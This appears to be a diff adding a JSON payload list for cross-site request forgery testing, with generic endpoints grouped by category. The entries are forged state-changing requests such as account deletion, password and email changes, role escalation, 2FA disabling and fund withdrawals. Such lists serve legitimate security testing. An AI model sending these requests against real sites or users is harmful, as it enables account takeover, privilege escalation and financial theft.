@@ -1,0 +1,49 @@
+{
+  "StateChange": [
+    "/change_email?email=hacker@example.com",
+    "/delete_account",
+    "/update_password?new=123456",
+    "/change_username?name=attacker",
+    "/update_profile?bio=Hacked"
+  ],
+
+  "TokenBypass": [
+    "/transfer?amount=1000",
+    "/settings?admin=true",
+    "/enable_2fa?status=off",
+    "/grant_role?role=superadmin",
+    "/disable_security?firewall=false"
+  ],
+
+  "SilentActions": [
+    "/subscribe_newsletter?email=attacker@evil.com",
+    "/vote_poll?option=3",
+    "/like_post?id=42",
+    "/follow_user?id=1337",
+    "/add_friend?id=999"
+  ],
+
+  "FinancialActions": [
+    "/withdraw?amount=5000",
+    "/deposit?amount=10000",
+    "/buy_item?id=123&price=999",
+    "/sell_item?id=321&price=100",
+    "/donate?amount=250&to=attacker"
+  ],
+
+  "PrivilegeEscalation": [
+    "/set_role?user=attacker&role=admin",
+    "/grant_access?resource=confidential",
+    "/enable_debug_mode?status=true",
+    "/unlock_feature?premium=true",
+    "/change_permissions?level=root"
+  ],
+
+  "ServiceManipulation": [
+    "/unsubscribe_service?id=1",
+    "/disable_notifications?status=true",
+    "/stop_subscription?plan=premium",
+    "/pause_account?duration=30",
+    "/cancel_order?id=555"
+  ]
+}
